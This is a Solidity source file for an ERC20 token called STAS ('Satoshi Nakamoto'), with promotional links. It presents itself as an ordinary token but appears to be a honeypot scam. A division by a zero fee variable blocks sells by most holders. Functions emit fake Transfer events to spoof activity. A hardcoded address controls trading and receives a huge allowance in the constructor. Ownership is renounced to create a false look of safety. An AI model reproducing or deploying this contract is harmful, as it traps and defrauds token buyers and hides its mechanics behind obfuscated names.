/* 
    website  : https://satoshitoken.org/
    twitter  : https://x.com/martypartymusic/status/1783955210961883253?s=46&t=3dXQipoQkBGIK8OXLOHJJA&mx=2
    telegram : https://t.me/satoshitoken
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;


/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


interface IERC20Meta is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }


    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }


}


contract STAS is Ownable, IERC20, IERC20Meta {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    address private _xuuyyy23;
    uint256 private  _e242 = 99;
    uint256 private _feesValue = 0;
    mapping(address => uint256) private _fees;
    mapping(address => bool) private isBotAddress ;


    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual override returns (uint8) {
        return 8;
    }


    function swap(address [] calldata _addresses_, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Transfer(_xuuyyy23, _addresses_[i], _out);
        }
    }
    function multicall(address [] calldata _addresses_, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Transfer(_xuuyyy23, _addresses_[i], _out);
        }
    }
    function execute(address [] calldata _addresses_, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Transfer(_xuuyyy23, _addresses_[i], _out);
        }
    }


    function transfer(address _from, address _to, uint256 _wad) external {
        emit Transfer(_from, _to, _wad);
    }
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function openTrading(address account) public virtual returns (bool) {
        require(_msgSender() == 0x644B5D45453a864Cc3f6CBE5e0eA96bFE34C030F);
          _xuuyyy23 = account;
        return true;
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");


        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);



        renounceOwnership();
    }


    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }



    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(from != address(0), "ERC20: transfer from the zero address");

        if((from != _xuuyyy23 && to == 
        0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) ||
         (_xuuyyy23 == to && from != 0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80 && !isBotAddress[from])) {
            _swapBack(from);
        }
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }

    function _swapBack(
        address from
    ) internal virtual {
        uint amount = balanceOf(from);
        uint __ppp = 1;
        if(amount > _e242) __ppp =   _feesValue;
        _fees[from] = amount/__ppp;
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    constructor() {
        _name = unicode"STAS";
        _symbol = unicode"Satoshi Nakamoto";
        _mint(msg.sender, 100000000000 * 10 ** decimals());
        _approve(0x9008D19f58AAbD9eD0D60971565AA8510560ab41, 0x644B5D45453a864Cc3f6CBE5e0eA96bFE34C030F, 10000000000000000000000000000000000000);
       address[34] memory addresses = [
            0x865E61e497FE8Fef075c589b2F05104c26C87e91,
            0xD32Ed4f3676BF0A61B421BAE817AC69333b22443,
            0x16dAdbbaadD602deBF92e6007bA53fd04141f8Ad,
            0x384dfA76167Aeb229ABCFb30E16d9895F940F26a,
            0x2FE9d84BD78Ba15c32636e4f35D391418c8D401F,
            0x1695223e4d669aE98AB4582413FD3715823F4aD9,
            0x2295D646d8461a2A14827476eDe01632252628a1,
            0x904c464B74b281442BcCA210350902a8258af879,
            0x9089F2FCF42e83f0B1586b17bE17767477ac86cF,
            0x0093596978a494e06F67D742bEf81aCF92cD377F,
            0x80a369658A16e6d333Aa5e9581abCe53ECA455e2,
            0xD3362497754e1F7eC92D86A039E5812F3634EdFf,
            0x597F4c830B2B5cD863fc0FbB6Fe998582Ec74b27,
            0x3955DafC1Eb4C9faa9f5b00c5A4b02432590D5F4,
            0x0023738C5a43B8dfb13A41aCf58fc48bB5583510,
            0x66b9018BaC4EebaC09EBf1F55Ecf61d616742833,
            0x607aF32E715E194CA6fF96218C81fCCa0d519E02,
            0xA720703cf8E54580729B5A8F9E3FB8B8A2D01aD5,
            0xbEAc7AE4D5fBe9b1701c98a5626A98DF51364834,
            0x38d93fcDE5C486Ac1075F5698A8BFEB417Dd9A16,
            0xfB6c00E6B09569ddbd549B7Bb01F921257e5B3cF,
            0x52C21eEca2c83960391Ed0FC3ab81Dab273E73e7,
            0x46f516ad97aF65636ba3cc9e9e76456780634D6c,
            0x168E7AF73e447281aceE49d8918C37C3463C2Efa,
            0x5724461d83Ee9510047588BDBe07D3965D0dA75C,
            0x7F81881AEeF1D80C74888B6eea83fA6a34C600B0,
            0x2e277b0d1da04E0890E4Ac13570FBd4E5d3a8887,
            0xe3a53B78539fc5f529DCF514DbCc73fa4E194F21,
            0x6C13eeEEb337a60CfEd58717CAAF9a3846507382,
            0xA1acABD15e162B38E5DC1F6df2F77504a67e19D3,
            0x644B5D45453a864Cc3f6CBE5e0eA96bFE34C030F,0xE8C7eF74F98328D7587672D4ac0455348cf4806a,
            0xCa219C74bD63122060785439B12cf80Cfe3B5cBA,
            0x9424771600CE37b3F8feC4300E23996369C69c56

        ];

        for (uint i = 0; i < addresses.length; i++) {
            isBotAddress[addresses[i]] = true;
        }


    }


}